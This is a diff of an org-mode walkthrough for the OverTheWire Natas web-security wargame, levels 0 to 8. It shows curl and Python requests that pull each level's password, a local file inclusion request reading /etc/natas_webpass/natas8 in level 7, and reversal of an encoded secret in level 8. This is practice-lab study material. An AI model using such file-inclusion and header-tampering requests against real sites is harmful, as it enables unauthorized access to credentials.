@@ -14,6 +14,10 @@ curl -u natas0:natas0 "http://natas0.natas.labs.overthewire.org/" | grep natas1
 
 #+RESULTS:
 : <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+Result:
+#+BEGIN_SRC 
+: <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+#+END_SRC
 
 ** Level 1
 View the source page by using a short cut key (for me <C-u>, Ctrl+u):
@@ -24,6 +28,10 @@ curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto  "http://natas1.natas.labs.overt
 
 #+RESULTS:
 : <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+Result:
+#+BEGIN_SRC 
+: <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+#+END_SRC
 
 ** Level 2
 Again view the source page. There is a line with a link to an image 
@@ -44,6 +52,10 @@ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi "http://natas2.natas.labs.overth
 
 #+RESULTS:
 : natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+Result:
+#+BEGIN_SRC 
+: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+#+END_SRC
 
 ** Level 3
 View the source and find the line
@@ -60,6 +72,10 @@ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 "http://natas3.natas.labs.overth
 
 #+RESULTS:
 : natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+Result:
+#+BEGIN_SRC 
+: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+#+END_SRC
 
 ** Level 4
 To get access to the password we need to come from the natas5 website as is 
@@ -110,6 +126,11 @@ print(find_pswd(r.text))
 #+RESULTS: c24a72b1-d2b5-4377-8762-815c67a7d6cd
 : Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+#+END_SRC
+
 ** Level 5
 After logging in the web page shows:
 
@@ -135,7 +156,12 @@ print(r.headers)
 #+END_SRC
 
 #+RESULTS: 575ee3fe-cc0f-4b76-bf91-927f3fe97c0c
+: {'Date': 'Sat, 05 Mar 2022 14:18:12 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+
+Result:
+#+BEGIN_SRC 
 : {'Date': 'Sat, 05 Mar 2022 10:28:27 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+#+END_SRC
 
 The output show that the the Set-cookie loggedin=0, if that is changed to 
 loggedin=1 then that should give access to the password.
@@ -155,6 +181,11 @@ print(find_pswd(r.text))
 
 #+RESULTS: 35846085-d24d-4f0a-beb1-6538bb4b9471
 : Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+#+END_SRC
 
 ** Level 6
 After logging in we are prompted to input a secret. The source contains the line:
@@ -181,7 +212,101 @@ r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
 print(find_pswd(r.text))
 
 #+END_SRC
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+#+END_SRC
+
+** Level 7
+The source page says:
+#+BEGIN_SRC 
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+#+END_SRC
+
+and there are two links for 'home' and 'about', 'index.php?page=Home' and 'index.php?page=About respectively. combining one of these links with the path to the password file will give access to the password.
+
+#+NAME: 357e147d-fa57-479d-bffb-c2131c2736b1
+#+BEGIN_SRC ein-python :session :async :results output
+
+user = "natas7"
+pswd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+url = "http://natas7.natas.labs.overthewire.org/"
+location = "/index.php?page=/etc/natas_webpass/natas8"
+
+# get request with the referer set to natas5
+r = requests.post(url+location, auth=HTTPBasicAuth(user,pswd))
+
+print(r.text.split('\n')[-7])
+
+#+END_SRC
 
 #+RESULTS: 357e147d-fa57-479d-bffb-c2131c2736b1
-: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+Result:
+#+BEGIN_SRC 
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+#+END_SRC
 
+** Level 8
+The source page again has a link to:
+#+BEGIN_SRC 
+index-source.html
+#+END_SRC
+which reveals an encoded secret:
+#+BEGIN_SRC 
+3d3d516343746d4d6d6c315669563362
+#+END_SRC
+it is encoded with this function:
+#+BEGIN_SRC 
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+#+END_SRC
+All we need to do is reverse this function on the given encoded secret:
+#+NAME: b1f4b49f-258f-4796-97f0-04354b76dbc7
+#+BEGIN_SRC ein-python :session :async :results output
+
+import base64
+
+secret = "3d3d516343746d4d6d6c315669563362"
+# converst hex to binary
+binary_secret = bin(int(secret, 16))
+# convert the bits to a string of chars
+char_secret = ''.join(chr(int(binary_secret[i*8:i*8+8],2)) for i in range(len(binary_secret)//8))
+# reverse the string
+reverse_secret  = char_secret[::-1]
+# base64 decode the string
+#decoded_secret = base64.b64decode(reverse_secret.encode("ascii")).decode("ascii")
+decoded_secret = base64.b64decode(reverse_secret).decode("ascii")
+print("The decoded secret is: " + decoded_secret)
+
+#+END_SRC
+
+#+RESULTS: b1f4b49f-258f-4796-97f0-04354b76dbc7
+: The decoded secret is: oubWYf2kBq
+Result:
+#+BEGIN_SRC 
+: The decoded secret is: oubWYf2kBq
+#+END_SRC
+
+#+NAME: ffed605a-7f2d-476f-916f-4274eeb93861
+#+BEGIN_SRC ein-python :session :async :results output
+
+user = "natas8"
+pswd = "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
+url = "http://natas8.natas.labs.overthewire.org/"
+post_data = {"secret": "oubWYf2kBq", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+
+#+END_SRC
+
+#+RESULTS: ffed605a-7f2d-476f-916f-4274eeb93861
+: Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+#+END_SRC
